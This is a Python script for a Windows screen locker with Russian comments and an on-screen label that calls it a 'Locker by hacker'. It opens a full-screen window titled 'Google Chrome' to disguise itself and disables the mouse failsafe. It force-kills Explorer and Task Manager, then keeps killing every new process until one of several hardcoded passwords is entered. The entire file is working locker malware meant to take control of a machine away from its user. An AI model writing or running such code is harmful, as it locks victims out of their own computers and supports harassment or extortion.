# from ctypes import *
import subprocess
from time import sleep
from tkinter import Tk, Entry, Label

allow = 0
allows = 0
import pyautogui
from pyautogui import click, moveTo

# windll.user32.BlockInput(True) #enable block

# # or
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
# ok = windll.user32.BlockInput(False) #disable block

root = Tk()
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
moveTo(width / 2, height / 2)


#
#
def callback(event):
    global k, entry
    if entry.get() == "vaicrkuesr" or entry.get() == "virus+hacker+algorithm" or entry.get() == "password":
        k = True


#
import psutil

# Iterate over all running process
for proc in psutil.process_iter():
    try:
        # Get process name & pid from process object.
        processName = proc.name()
        processID = proc.pid
        print(processName, ' ::: ', processID)
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        pass


def on_closing():
    # Кликаем в центр экрана
    # click(width/2, height/2)
    # Перемещаем курсор мыши в центр экрана

    # Включаем полноэкранный режим
    root.attributes("-fullscreen", True)
    # При попытке закрыть окно с помощью диспетчера задач вызываем on_closing
    root.protocol("WM_DELETE_WINDOW", on_closing)
    # Включаем постоянное обновление окна
    root.update()
    # Добавляем сочетание клавиш, которые будут закрывать программу
    root.bind('<Control-KeyPress-c>', callback)


# Создаем окно
# moveTo(width / 2, height / 2)
# Вырубаем защиту левого верхнего угла экрана
pyautogui.FAILSAFE = False
# # Получаем ширину и высоту окна
#
# # Задаем заголовок окна
root.title('Google Chrome')
# # Открываем окно на весь экран
root.attributes("-fullscreen", True)
# # Создаем поле для ввода, задаем его размеры и расположение
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=width / 2 - 75, y=height / 2 - 25)
# Создаем текстовые подписи и задаем их расположение
label0 = Label(root, text="╚(•⌂•)╝ Locker by 'hacker' (╯°□°）╯︵ ┻━┻", font=1)
label0.grid(row=0, column=0)
label1 = Label(root, text="Пиши пароль и жми Ctrl + C", font='Arial 20')
label1.place(x=width / 2 - 75 - 130, y=height / 2 - 25 - 100)
# Включаем постоянное обновление окна и делаем паузу
root.update()
sleep(0.2)
# # Кликаем в центр окна
click(width / 2, height / 2)
# обнуляем ключ
k = False


def getProcessIdSet() -> set:
    process_set: set = set()
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        process_set.add(str(proc.pid))
    return process_set


def killAllNotInitial(initial_set: set, current_set: set):
    kill_set: set = current_set.difference(initial_set)

    for proc_id in kill_set:
        try:
            subprocess.call("taskkill /F /PID " + proc_id + " /T", startupinfo=si)
        except BaseException:
            print("error killing " + proc_id)

try:
    subprocess.call("taskkill /F /IM explorer.exe", startupinfo=si)
    subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si)
except BaseException:
    print("error killing explorer/Taskmgr")


initial_set = getProcessIdSet()

while not k:
    killAllNotInitial(initial_set, getProcessIdSet())
    on_closing()
